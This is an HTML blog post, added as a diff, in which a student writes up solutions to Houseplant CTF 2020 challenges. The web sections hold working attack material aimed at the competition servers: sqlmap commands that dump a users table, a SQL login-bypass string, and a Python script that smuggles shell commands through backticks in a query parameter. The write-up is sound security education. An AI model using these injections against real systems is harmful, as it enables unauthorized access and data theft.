@@ -1,0 +1,150 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Houseplant CTF 2020 Writeup</title><link href="/css/style.min.css" rel="stylesheet"></head><body><header><div class="header-container"><h1>Houseplant 2020 Writeup</h1><nav><ul><li><a href="/index.html">Home</a></li><li><a href="/portfolio/index.html">Portfolio</a></li><li><a href="/blog/index.html">Blog</a></li><li><a href="/contact.html">Contact</a></li></ul></nav></div></header><main><div class="main-container"><!--[if lt IE 9]>
+                    <p class="warn">You are using Internet Explorer lower than 9.<br>Please <a href="http://browsehappy.com/">upgrade your browser</a> to make the most of the web.</p>
+                <![endif]--><p class="date-posted">Posted on 27th April 2020</p><article><p>This weekend the <a href="http://monsec.io">Monash Cyber Security Club MonSec</a> participated in the Capture the Flag competition <a href="https://houseplant.riceteacatpanda.wtf">Houseplant CTF</a>, placing 12th overall! It was quite unusually themed - instead of the usual "1337 haxxor" aesthetic the organisers of this CTF went for a more "cute" approach, and it worked quite well. Of course, the challenges were pretty cool too. Here are some of the challenges I solved and how I went about them.</p><p></p><ul><li><a href="#i-dont-like-needles">I don't like needles (web)</a></li><li><a href="#qr-generator">QR Generator (web)</a></li><li><a href="#11">11 (crypto)</a></li><li><a href="#breakable">Breakable (reverse engineering)</a></li><li><a href="#ezoterik">Ezoterik (forensics)</a></li><li><a href="#music-lab">Music Lab (misc)</a></li></ul><p></p><section id="i-dont-like-needles"><h2>I don't like needles (web)</h2><p>It becomes quickly obvious that the intended route is to perform some SQL injection. When performing SQL injections, I am rarely disappointed by the excellent <a href="http://sqlmap.org/">sqlmap</a>. My process is usually two-fold: trying to get an injection, and then exploiting it to dump the necessary data.</p><pre><code class="plaintext">$ sqlmap --batch --forms --level 5 --risk 3 -u http://challs.houseplant.riceteacatpanda.wtf:30001/</code></pre><p>Choosing a higher level and risk allowed sqlmap to detect a boolean based blind injection rather than just a time-based injection. <code>--level 5 --risk 3</code> is often a good choice for CTFs because it can detect more sneaky injections, and you do not care about any potential damage since it is a fictional environment.</p><p>We get the list of tables with:</p><pre><code class="plaintext">$ sqlmap --batch --forms --tables -u http://challs.houseplant.riceteacatpanda.wtf:30001/</code></pre><p>Then, since there is a <code>users</code> table, we just dump it:</p><pre><code class="plaintext">$ sqlmap --batch --forms --dump -T users -u http://challs.houseplant.riceteacatpanda.wtf:30001/
+
++------+-----------+------------------------------------------+
+| id   | username  | password                                 |
++------+-----------+------------------------------------------+
+| 1    | mrbossman | Nvbn89nXs1prcYMtFAG4MK1mgJeKaTw7Z5Uh28ig |
+| 2    | flagman69 | bW4DHo6n7cWpr0y6nuKso0HOExX1Tn2Zm5PLOfu7 |
++------+-----------+------------------------------------------+
+</code></pre><p>At this point, I was a bit stuck since I could not figure out how to crack the password. Luckily, I had an awesome team which helped me realise I was overthinking this challenge a lot. The provided source code clearly wanted us to log in as <code>flagman69</code>. So all that needed to be done was submitting <code>flagman69' -- a</code> in the username field. Out pops the flag: <code>rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t}</code></p></section><section id="qr-generator"><h2>QR Generator (web)</h2><p>This was a very enjoyable challenge. We are given a field to type text, which is sent to <code>/qr?text=OUR_INPUT</code>. If typing "good" strings (i.e. not trying to inject anything) we get a QR code that resolves to the first letter of that string. The challenge also has the hint "For some reason, my website isn't too fond of backticks...". Backticks are used for <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html">command substitution</a> on many shells in Unix. Sure enough, trying <code>`ls`</code> yielded the letter <code>R</code>. After some trial and error, I produced the following script which allowed me to get the output of arbitrary commands, automagically with the power of <a href="https://pypi.org/project/pyzbar/">pyzbar</a> and <a href="https://pillow.readthedocs.io/en/stable/">pillow</a> and <a href="https://requests.readthedocs.io/en/master/">requests</a>:</p><pre><code class="lang-python">import requests
+from PIL import Image
+from io import BytesIO
+from pyzbar.pyzbar import decode as decodeQR
+
+# found actual "endpoint" at /qr by reading source code
+URL = 'http://challs.houseplant.riceteacatpanda.wtf:30004/qr'
+
+def execute_command(command):
+    result = ''
+    latest_char = 'blah'  # somthing other than '' or '\n'
+    i = 1
+    while latest_char != '' and latest_char != '\n':
+        # tr "\n" " " ensures everything goes onto one line
+        # (to make it easy to extract)
+        # cut -c from i to i simply gets character at index i (1 indexed)
+        payload = f'`{command} | tr "\\n" " " | cut -c {i}-{i}`'
+        r = requests.get(URL, params={'text': payload})
+        qr_code = Image.open(BytesIO(r.content))
+        latest_char = decodeQR(qr_code)[0].data.decode('utf-8')
+        result += latest_char
+        print(result)
+        i += 1
+
+#execute_command('ls')
+execute_command('cat flag.txt')</code></pre><p>Running <code>ls</code> we get <code>README.md app flag.txt node_modules package.json start.sh yarn.lock</code>, and then we can simply <code>cat flag.txt</code> to read the flag <code>rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}</code>.</p></section><section id="11"><h2>11 (crypto)</h2><p>This was a surprisingly challenging puzzle, but I would not say it is "crypto". We are given this script (emphasis with solution mine):</p><pre><code class="plaintext">(doorbell rings)
+delphine: Jess, I heard you've been stressed, you should know <strong>I'm</strong> always ready to help!
+Jess: Did you make something? I'm <strong>hungry</strong>...
+Delphine: Of course! Fresh from the bakery, I wanted to <strong>give</strong> you something, after all, you do so much to help <strong>me</strong> all the time!
+Jess: Aww, thank you, Delphine! Wow, this <strong>bread</strong> smells good. How is the bakery?
+Delphine: Lots of customers <strong>and</strong> positive reviews, all thanks to the mention in rtcp!
+Jess: <strong>I</strong> am really glad it's going well! During the weekend, I <strong>will</strong> go see you guys. You know how much I really <strong>love</strong> your amazing black forest cakes.
+Delphine: Well, you know that <strong>you</strong> can get a free slice anytime you want.
+(doorbell rings again)
+Jess: Oh, that must be Vihan, we're discussing some important details for rtcp.
+Delphine: sounds good, I need to get back to the bakery!
+Jess: Thank you for the bread! &lt;3</code></pre><p>We also get these hints:<br></p><ul><li>I was eleven when I finished A Series of Unfortunate Events.</li><li>Flag is in format: rtcp{.*} add _ (underscores) in place of spaces.</li><li>Character names count too</li></ul><p></p><p>Googling for "A Series of Unfortunate Events cipher" we find the <a href="https://snicket.fandom.com/wiki/Sebald_Code">Sebald Code</a>. You simply take every 11th word, and you only consider the text between doorbell rings (as shown in bold above).</p><p>Therefore, we get the flag <code>rtcp{I'm_hungry_give_me_bread_and_I_will_love_you}</code>.</p></section><section id="breakable"><h2>Breakable (reverse engineering)</h2><p>This challenge involved reverse engineering some Java source code. Yeah, source code, not a compiled binary. Regardless, it proved to require quite some effort. The full source is below:</p><pre><code class="lang-java">import java.util.*;
+
+public class breakable
+{
+    public static void main(String args[]) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.print("Enter flag: ");
+        String userInput = scanner.next();
+        String input = userInput.substring("rtcp{".length(),userInput.length()-1);
+        if (check(input)) {
+            System.out.println("Access granted.");
+        } else {
+            System.out.println("Access denied!");
+        }
+    }
+    
+    public static boolean check(String input){
+        boolean h = false;
+        String flag = "k33p_1t_in_pl41n";
+        String theflag = "";
+        int i = 0;
+        if(input.length() != flag.length()){
+            return false;
+        }
+        for(i = 0; i &lt; flag.length()-2; i++){
+            theflag += (char)((int)(flag.charAt(i)) + (int)(input.charAt(i+2)));
+        }
+        for(i = 2; i &lt; flag.length(); i++){
+            theflag += (char)((int)(flag.charAt(i)) + (int)(input.charAt(i-2)));
+        }
+        String[] flags = theflag.split("");
+        for(; i &lt; (int)((flags.length)/2); i++){
+            flags[i] = Character.toString((char)((int)(flags[i].charAt(0)) + 20));
+        }
+        return theflag.equals("ÒdÝ¾¤¤¾ÙàåÐcÝÆÏÜ¦aã");
+    }
+}</code></pre><p>First of all, we can realise that the last for loop has no effect on the final result as <code>flags</code> is not used. To get the actual flag, we need to, in essence, perform the operations in reverse i.e. by subtracting instead of adding. Due to some luck (but mostly because all the characters in the final flag have ASCII code no more than 127) we do not even need to perform <code>% 256</code> to simulate byte wrap-around.</p><pre><code class="lang-python">seed_string = "k33p_1t_in_pl41n"
+
+desired_result = "\xd2\x92\x64\xdd\xbe\xa4\xa4\xbe\xd9\xe0\x8f\xe5\xd0\x93\x63\xdd\xc6\x90\xa5\xcc\xc8\xe1\x8f\xcf\xdc\xa6\x61\xe3"
+
+print(len(desired_result))
+
+# the comparer starts by adding each character from index 2 onwards in our input
+# against the seed_string, so let's subtract (first half is 14 chars because two halves of 16 - 2 chars)
+
+solution_2_onwards = ''
+for i in range(14):
+    solution_2_onwards += chr(ord(desired_result[i]) - ord(seed_string[i]))
+
+print(solution_2_onwards)
+
+solution_start_to_2_before = ''
+for i in range(14):
+    solution_start_to_2_before += chr(ord(desired_result[i + 14]) - ord(seed_string[i+2]))
+
+print(solution_start_to_2_before)
+
+print('final', 'rtcp{' + solution_start_to_2_before + solution_2_onwards[-2:] + '}')</code></pre><p>Flag is <code>rtcp{0mg_1m_s0_pr0ud_}</code></p></section><section id="ezoterik"><h2>Ezoterik (forensics)</h2><p>We are given an image with some strange text going around it. The text transcribed reads:</p><pre><code class="plaintext">+[---&gt;++&lt;]&gt;+++.[-&gt;++++&lt;]&gt;+.----.+++++++.----[-&gt;+++&lt;]&gt;.------------.+[-----&gt;+&lt;]&gt;+.+.[-&gt;+++++&lt;]++.------------.---[-&gt;++++&lt;]&gt;-.----.+++..+++++++.-----[++&gt;---&lt;]&gt;.</code></pre><p>This is <a href="[200~https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>, one of the most famous esoteric programming languages. Unfortunately, evaluating this code with <a href="https://copy.sh/brainfuck/">Brainfuck interpreter</a> gives us a hang after spitting out some near-useless output. Using a <a href="https://fatiherikli.github.io/brainfuck-visualizer/">visualiser</a> we see that the last loop is the culprit. Anyway, the output that we do get is:</p><pre><code class="plaintext">Yeah, noööòõõü</code></pre><p>Ultimately, this turned out the be a red herring. Running the classic <code>strings</code> command on the image instead produced this suspicious block of text at the end:</p><pre><code class="plaintext">2TLEdubBbS21p7u3AUWQpj1TB98gUrgHFAiFZmbeJ8qZFb9qCUc8Qp6o86eJYkrm2NLexkSDyRYd3X9sRCRKJzoZnDtrWZKcHPxjoRaFPHfmeUyoxyyWQtiqEgdJR1WU4ywAYqRq7o55XLUgmdit6svgviN8qy72wvLvT2eWjECbqHdrKa2WjiAEvgaGxVedY8SRXXcU9JbP5Ps3RY2ieejz6DrF9NBD7mri2wrsyDs9gpVgosxnYPbwjGdmsq7GwudbqtJ7SeKgaStmygyfPast5F3ZKL9KeC2LzCeenffoZ4d4Cna7TZdkUsfdK1HNmoB46fo9jK5ENQwnWdPmZBnZ4h8uDxHpQF74rs3wPcpmch6Byu31och1cyz8JxgXkacHpTrGeAN2bEhRp8kDQpmPtj9QqaAgxTbam9hoB4mvtrRmRx5GnzzZoWW5qDxwMvgKCYWiLwtLcvjDZPNdHGbvFspFeCq7kBcTeyrjYeHxuwwwM1GpdwMdxzNiFK1jYkA4DUZRohuKxeyhBFiY9HuwD6zKf9nZMThoYwTGhAJR2d3GqVqXGsivAKLs1oBzrmH9V6vaMwAjM7Hu69TLfKHtZUThoiEDftxPJdraNxoQps3mFamNbT1U3kRdpAz5s5kq6i2jLBUjBjAdV9N8jWNqx4RgiaHTW5qqb8E6JvHgQyrVkLmMdsjoLAWaWZLRw2pQpBJehRsx1LU6wmAC1nfeLbdQxPmytaMUURBDhHVqPNxwThCzZsnA9RuKrYWGsmyTxCzVUEjvUXaU4hkoV62qn7G1TnVRiADNhRfMnxm8R2ZoSPxEhVaFyHvLweq</code></pre><p>Throwing that into <a href="https://gchq.github.io/CyberChef/">CyberChef</a> gives us a nice "magic wand" that detected decoding with Base58 is what we are after:</p><pre><code class="plaintext">elevator lolwat
+  action main
+    show 114
+    show 116
+    show 99
+    show 112
+    show 123
+    show 78
+    show 111
+    show 116
+    show 32
+    show 113
+    show 117
+    show 105
+    show 116
+    show 101
+    show 32
+    show 110
+    show 111
+    show 114
+    show 109
+    show 97
+    show 108
+    show 32
+    show 115
+    show 116
+    show 101
+    show 103
+    show 111
+    show 95
+    show 52
+    show 120
+    show 98
+    show 98
+    show 52
+    show 53
+    show 103
+    show 121
+    show 116
+    show 106
+    show 125
+  end action
+  action show num
+    floor num
+    outFloor
+  end action
+end elevator</code></pre><p>After some googling, we find the <a href="https://esolangs.org/wiki/Elevator">Elevator esoteric language</a>. It has no interpreter. But, that is fine, because the above program is very trivial and simply appears to print one character at a time corresponding to the following ASCII codes:</p><pre><code class="plaintext">114 116 99 112 123 78 111 116 32 113 117 105 116 101 32 110 111 114 109 97 108 32 115 116 101 103 111 95 52 120 98 98 52 53 103 121 116 106 125</code></pre><p>Converting from decimal (again using something like CyberChef) gives us the flag <code>rtcp{Not quite normal stego_4xbb45gytj}</code>.</p></section><section id="music-lab"><h2>Music Lab (misc)</h2><p>This was a straightforward but nice challenge. We are given a <code>.mid</code> file. Since <a href="https://en.wikipedia.org/wiki/MIDI">MIDI</a> is quite different from other sound formats in that it stores information about each instrument and each keypress separately, I thought that visualising it would be enough to give us the flag. Indeed, even using some online tool <a href="https://onlinesequencer.net/import">like this one</a> gave us the results we wanted: <code>rtcp{M0Z4rt_WOuld_b3_proud}</code></p><img src="/img/houseplant-ctf-2020-music-lab.png" alt="MIDI visualisation showing text rtcp{M0Z4rt_WOuld_b3_proud}" width="100%"></section></article></div></main><script src="/js/vendor.js"></script><script>hljs.initHighlightingOnLoad();</script></body></html>
